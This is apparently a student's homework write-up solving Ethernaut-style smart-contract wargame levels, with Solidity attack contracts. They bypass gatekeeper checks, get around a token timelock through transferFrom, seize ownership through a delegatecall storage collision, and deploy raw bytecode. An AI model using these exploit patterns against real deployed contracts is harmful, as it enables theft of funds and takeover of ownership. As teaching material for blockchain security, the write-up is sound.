# hw6 group

### GateKeeperOne


- solution
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {

    function enter(address _target, uint gas) external {
        GatekeeperOne target = GatekeeperOne(_target);

        // k = uint64(_gateKey);
        // uint32(k) == uint16(k), "GatekeeperOne: invalid gateThree part one");
        // uint32(k) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        uint16 k16 = uint16(uint160(tx.origin));

        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);

        require(gas < 8191, "gas must < 8191");
        require(target.enter{gas: 8191 * 10 + gas}(key), "gas error");
    }
}

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

### GatekeeperTwo
 assembly 是一種低階的程式語言用法，允許 Solidity 合约開發者直接訪問 EVM（Ethereum Virtual Machine）的指令集和内存模型，以實現更高效和更靈活的合约编程。

 ![](https://i.imgur.com/2hjVNk9.png)

- solution
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    constructor(GatekeeperTwo target) {
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = s ^ type(uint64).max;

        bytes8 key = bytes8(k);
        require(target.enter(key), "failed");
    }
}

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

###  Naught Coin
- remix deploy
- approve remix contract
-![](https://i.imgur.com/KuccT01.png)

- transfer (call pwn function)

- get balance is 0
- ![](https://i.imgur.com/kllAU9S.png)


- solution code
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

interface INaughtCoin {
    function player() external view returns(address);
}


contract Hack {
    function pwn(IERC20 coin) external {
        address player = INaughtCoin(address(coin)).player();
        uint balance = coin.balanceOf(player);
        coin.transferFrom(player, address(this), balance);
    }
}


contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player)
  ERC20("NaughtCoin", "0x0") {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  }
}
```


### Preservation
- be a hacker
- 在 Solidity 中，delegatecall 是一種合約交互的機制。它可以讓一個合約調用另一個合約的函數，並在被調用的合約中執行代碼，但是被調用的合約會共享調用者的存儲空間。這使得 delegatecall 用於一些特殊的場景，比如合約升級、合約庫等。

- solution
```solidity!
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {

  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  function attack(Preservation target) external{
      target.setFirstTime(uint256(uint160(address(this))));
      target.setFirstTime(uint256(uint160(msg.sender)));
      require(target.owner() == msg.sender, "Failed to take ownership");
  }

  function setTime(uint _owner) external {
    owner = address(uint160(_owner));
  }
}

contract Preservation {

  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```


### Recovery

- reference [How is the address of an Ethereum contract computed?](https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed#:~:text=The%20address%20for%20an%20Ethereum,then%20hashed%20with%20Keccak%2D256.)

- recovery
- ![](https://i.imgur.com/id0SesJ.png)

- destory by SimpleToken
- ![](https://i.imgur.com/0armrbl.png)


```solidity!
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Dev {
  function recover(address sender) external pure returns (address) {
    address addr = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), sender, bytes1(0x01))))));
    return addr;
  }
}
```

### MagicNumber


```solidity!
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Hack {
    // function whatIstheMeaningOfLife() external pure returns (uint) {
    //     return 42;
    // }

    constructor(MagicNum target) {
        bytes memory bytecode = hex"602a60005260206000f3";
        address addr;
        assembly {
            addr := create(0, add(bytecode, 0x20), 0x13) //38 / 2, to use (19).toString(16)
        }
        require(addr != address(0));
        target.setSolver(addr);
    }
}
```